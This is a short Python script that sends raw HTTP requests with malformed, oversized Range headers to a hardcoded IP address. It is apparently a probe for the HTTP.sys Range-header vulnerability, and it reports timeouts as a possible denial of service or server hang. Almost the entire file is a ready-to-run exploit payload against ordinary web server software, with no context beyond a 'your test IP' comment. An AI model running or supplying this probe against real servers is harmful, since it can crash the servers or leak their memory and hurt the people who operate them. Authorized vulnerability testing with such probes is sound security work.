```python
import socket

def test_malformed_ranges(target_ip, target_port=80):
    test_ranges = [
        "bytes=0-",
        "bytes=0-18446744073709551615,0-",
        "bytes=0-1,2-18446744073709551615",
        "bytes=18446744073709551615-0",
        "bytes=18446744073709551615-18446744073709551615",
    ]
    for rng in test_ranges:
        payload = (
            "GET / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Range: {rng}\r\n"
            "User-Agent: HTTP.sys-MalformedTester\r\n"
            "Connection: close\r\n\r\n"
        )
        print(f"Testing Range header: {rng}")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((target_ip, target_port))
                s.sendall(payload.encode())
                response = s.recv(4096)
                print(response.decode(errors='ignore'))
        except socket.timeout:
            print("No response (timeout) - possible DoS or server hang")
        except Exception as e:
            print(f"Exception: {e}")
        print("-" * 40)

if __name__ == "__main__":
    target = "103.127.29.31"  # your test IP
    test_malformed_ranges(target)
```
